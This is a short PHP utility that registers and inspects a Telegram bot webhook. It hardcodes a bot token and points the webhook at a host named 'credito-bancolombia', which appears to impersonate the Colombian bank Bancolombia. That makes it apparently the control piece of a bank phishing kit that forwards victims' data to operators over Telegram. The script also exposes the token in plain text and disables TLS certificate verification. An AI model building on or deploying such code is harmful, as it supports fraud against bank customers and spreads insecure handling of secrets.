<?php

header("Content-Type: application/json; charset=utf-8");

$DEFAULT_BOT_TOKEN_OPS = "8924841749:AAG6MK_tMpRF19EehX5iEQdfotCySeD6m4c";
$WEBHOOK_URL = "https://credito-bancolombia.onrender.com/BANCOLOMBIA/webhook.php";

$envBot = getenv('TELEGRAM_BOT_TOKEN_OPS');
$botToken = $DEFAULT_BOT_TOKEN_OPS;
if (is_string($envBot)) {
    if (trim($envBot) !== '') {
        $botToken = $envBot;
    }
}

$action = isset($_GET['a']) ? $_GET['a'] : 'info';
$resp = array('action' => $action, 'bot_prefix' => substr($botToken, 0, 10) . '...');

if ($action === 'set') {
    $url = "https://api.telegram.org/bot" . $botToken . "/setWebhook?url=" . rawurlencode($WEBHOOK_URL);
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    $out = curl_exec($ch);
    $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    $resp['setWebhook_http'] = (int)$code;
    $resp['setWebhook_body'] = $out;
}

$gi = "https://api.telegram.org/bot" . $botToken . "/getWebhookInfo";
$ch2 = curl_init($gi);
curl_setopt($ch2, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch2, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch2, CURLOPT_TIMEOUT, 30);
$out2 = curl_exec($ch2);
$code2 = curl_getinfo($ch2, CURLINFO_HTTP_CODE);
curl_close($ch2);
$resp['getWebhookInfo_http'] = (int)$code2;
$j = json_decode($out2, true);
$resp['getWebhookInfo_result'] = is_array($j) && isset($j['result']) ? $j['result'] : null;

echo json_encode($resp, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES);
exit;
